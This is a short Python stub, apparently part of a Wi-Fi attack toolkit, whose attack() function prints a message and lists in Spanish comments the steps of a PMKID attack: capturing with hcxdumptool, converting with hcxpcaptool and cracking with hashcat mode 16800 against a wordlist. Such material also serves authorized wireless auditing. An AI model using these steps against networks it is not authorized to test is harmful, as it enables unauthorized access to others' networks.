# attacks/pmkid_attack.py
import os
import subprocess
from utils import persistence

def attack(interface, bssid, wordlist, resume_session):
    # Lógica similar al ataque de diccionario para la persistencia
    
    print(f"Iniciando ataque PMKID a {bssid}")
    # 1. Utilizar hcxdumptool para capturar el PMKID del AP
    # hcxdumptool -i <interface> -o capture.pcapng --enable_status=1
    
    # 2. Convertir la captura a un formato compatible con hashcat
    # hcxpcaptool -z pmkid.16800 capture.pcapng
    
    # 3. Usar hashcat para crackear el hash con el diccionario
    # hashcat -m 16800 pmkid.16800 <wordlist>